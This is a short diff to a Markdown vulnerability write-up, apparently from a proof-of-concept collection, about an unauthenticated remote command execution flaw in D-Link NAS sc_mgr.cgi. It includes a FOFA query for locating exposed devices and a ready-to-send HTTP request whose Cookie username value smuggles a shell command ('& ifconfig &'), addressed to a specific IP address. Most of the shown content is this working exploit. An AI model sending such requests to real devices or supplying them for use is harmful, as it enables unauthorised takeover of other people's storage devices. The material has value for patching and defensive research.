@@ -79,6 +79,7 @@ FOFA：body="/cgi-bin/login_mgr.cgi"  &&  body="cmd=cgi_get_ssl_info"
 
 POC/EXP：
 
+```http
 GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
 Host: 81.98.246.72
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
@@ -86,6 +87,8 @@ Accept: */*
 Accept-Encoding: gzip, deflate
 Connection: close
 Cookie: username=mopfdfsewo'& ifconfig & echo 'mopfdfsewo;
+```
+
 
 ![image-20241119211127581](./.resource/D-LinkNAS设备sc_mgr.cgi未授权RCE漏洞/media/image-20241119211127581.png)
 
